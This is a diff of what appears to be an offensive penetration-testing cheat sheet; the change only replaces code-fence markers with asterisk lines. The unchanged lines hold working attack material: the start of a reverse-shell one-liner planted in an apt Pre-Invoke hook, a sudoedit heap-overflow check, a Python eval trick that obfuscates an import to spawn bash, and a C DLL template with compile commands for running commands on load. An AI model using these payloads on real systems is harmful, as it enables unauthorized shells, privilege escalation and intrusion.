@@ -1126,17 +1126,17 @@ echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 
 
 [sudoedit]
 * check for vulnerable
-```
+***
 sudoedit -s '\' `perl -e 'print "A" x 65536'`
-```
+***
 
 [python bypass]
-```
+***
 eval("__impo"+"rt__('o"+"s').system('bash')")
-```
+***
 
 [Generate dll that execute command]
-```
+***THE CODE***
 #include <windows.h>
 int NotLahMal()
 {
@@ -1149,7 +1149,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  NotLahMal();
  return 0;
 }
-```
+*************
 
 >> Compile with cl.exe
 call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat" && cl /LD notamal.c
